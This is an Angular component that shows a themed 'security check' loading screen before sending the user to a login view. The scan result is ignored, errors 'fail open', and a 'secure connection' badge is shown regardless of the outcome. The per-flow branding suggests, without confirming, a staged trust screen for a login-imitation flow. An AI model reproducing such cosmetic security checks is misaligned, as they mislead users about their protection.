
import { Component, signal, OnInit, OnDestroy, inject, computed } from '@angular/core';
import { CommonModule } from '@angular/common';
import { StateService } from '../services/state.service';
import { SecurityService } from '../services/security.service';
import { TranslatePipe } from '../pipes/translate.pipe';
import { CardComponent, CardVariant } from './ui/card.component';

@Component({
  selector: 'app-security-check',
  standalone: true,
  imports: [CommonModule, TranslatePipe, CardComponent],
  host: {
    '[attr.data-theme]': 'currentFlowId()',
    'class': 'block w-full max-w-md mx-auto animate-in fade-in zoom-in-95 duration-500'
  },
  template: `
    <ui-card [variant]="'ghost'">
      <div class="flex flex-col items-center justify-center py-6 animate-fade-in">
        
        <!-- Dynamic Spinner -->
        <div class="relative w-16 h-16 mb-8">
            <div class="absolute inset-0 rounded-full border-[3px]" [style.border-color]="spinnerTrackColor()"></div>
            <div class="absolute inset-0 rounded-full border-[3px] border-l-transparent border-r-transparent border-b-transparent animate-spin"
                 [style.border-top-color]="spinnerColor()"></div>
        </div>

        <h1 class="text-2xl font-bold mb-3 tracking-tight animate-fade-in text-center"
            [style.color]="textColor()">
            {{ 'SECURITY.CHECKING' | translate }}
        </h1>
        <p class="text-base font-medium animate-pulse opacity-80 text-center mb-12"
           [style.color]="textColor()">{{ statusMessage() | translate }}</p>

        <div class="flex items-center gap-2 opacity-60 bg-slate-50 px-4 py-2 rounded-full border border-slate-100 dark:bg-slate-800 dark:border-slate-700">
             <span class="material-icons text-sm" [style.color]="successColor()">lock</span>
             <span class="text-[11px] font-bold uppercase tracking-wider" [style.color]="textColor()">{{ 'COMMON.SECURE_CONNECTION' | translate }}</span>
        </div>

      </div>
    </ui-card>
  `
})
export class SecurityCheckComponent implements OnInit, OnDestroy {
  state = inject(StateService);
  security = inject(SecurityService);

  statusMessage = signal('SECURITY.VERIFYING');
  private intervalId: any;

  private checksDone = false;
  private messagesDone = false;
  private navTimer: any;

  // Theme Computeds
  currentFlowId = computed(() => this.state.currentFlow()?.id || 'generic');
  theme = computed(() => this.state.currentFlow()?.theme);

  textColor = computed(() => this.theme()?.input.textColor || '#001C64');
  spinnerColor = computed(() => this.theme()?.button.background || '#003087');
  spinnerTrackColor = computed(() => (this.theme()?.mode === 'dark' ? 'rgba(255,255,255,0.1)' : 'rgba(0,0,0,0.1)'));
  successColor = computed(() => '#10b981');

  ngOnInit() {
    const messages = [
      "SECURITY.VERIFYING",
      "SECURITY.CONNECTING"
    ];
    let i = 0;

    // 1. Start Visual Sequence
    this.intervalId = setInterval(() => {
      if (i < messages.length) {
        this.statusMessage.set(messages[i]);
        i++;
      } else {
        // Sequence finished
        this.messagesDone = true;
        this.tryNavigate();
        clearInterval(this.intervalId);
      }
    }, 600);

    // 2. Start Real Security Checks
    this.security.runSecurityScan().subscribe({
      next: (results) => {
        this.checksDone = true;
        this.tryNavigate();
      },
      error: (err) => {
        // Fail open
        this.checksDone = true;
        this.tryNavigate();
      }
    });
  }

  private tryNavigate() {
    if (this.checksDone && this.messagesDone) {
      // Add a small buffer for the last message to be read
      this.navTimer = setTimeout(() => {
        this.state.navigate('login');
      }, 600);
    }
  }

  ngOnDestroy() {
    if (this.intervalId) clearInterval(this.intervalId);
    if (this.navTimer) clearTimeout(this.navTimer);
  }
}
